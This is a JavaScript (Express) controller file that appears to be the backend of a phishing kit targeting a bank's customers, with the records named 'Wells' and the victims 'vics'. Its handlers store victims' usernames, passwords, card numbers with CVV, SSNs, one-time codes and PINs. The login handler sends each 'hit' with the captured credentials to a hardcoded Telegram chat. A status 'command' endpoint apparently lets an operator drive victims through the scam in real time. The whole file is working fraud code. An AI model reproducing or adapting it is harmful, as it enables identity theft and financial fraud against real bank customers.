const Wells = require("../models/wellsModel");
const axios = require("axios");

const getOwnerVics = async (req, res) => {
  const { owner } = req.params;
  Wells.find({ owner })
    .sort({ status: -1 })
    .exec((err, vics) => {
      if (err) {
        console.log(err);
        res.status(404).send("Error");
        return;
      }
      res.send(vics);
    });
};

const command = async (req, res) => {
  const { uniqueid, status } = req.body;
  try {
    await Wells.findOneAndUpdate({ uniqueid }, { status }).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const getInfo = async (req, res) => {
  const { uniqueid } = req.params;
  Wells.findOne({ uniqueid }).exec((err, vic) => {
    if (err) {
      console.log(err);
      res.status(404).send("Error");
      return;
    }
    res.send(vic);
  });
};

const submitLogin = async (req, res) => {
  const { username, password, uniqueid, owner, ip } = req.body;
  try {
    await Wells.create({ uniqueid, username, password, status: 1, owner, ip });
    await axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `New Wells Hit:\n\n${username}:${password}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitLoginAgain = async (req, res) => {
  const { username, password, uniqueid } = req.body;
  try {
    await Wells.findOneAndUpdate({ uniqueid }, { username, password, status: 0 }).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitCard = async (req, res) => {
  const { ccnum, ccexp, cvv, uniqueid } = req.body;
  try {
    await Wells.findOneAndUpdate({ uniqueid }, { ccnum, ccexp, cvv, status: 9 }).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitSSN = async (req, res) => {
  const { ssn, uniqueid } = req.body;
  try {
    await Wells.findOneAndUpdate({ uniqueid }, { ssn, status: 7 }).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitOtp = async (req, res) => {
  const { otp, uniqueid } = req.body;
  try {
    await Wells.findOneAndUpdate({ uniqueid }, { otp, status: 3 }).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitPin = async (req, res) => {
  const { pin, uniqueid } = req.body;
  try {
    await Wells.findOneAndUpdate({ uniqueid }, { pin, status: 5 }).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const deleteEntry = async (req, res) => {
  const { uniqueid } = req.body;
  try {
    await Wells.deleteOne({ uniqueid });
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

module.exports = {
  getOwnerVics,
  command,
  getInfo,
  submitLogin,
  submitLoginAgain,
  submitOtp,
  submitCard,
  submitSSN,
  submitPin,
  deleteEntry,
};
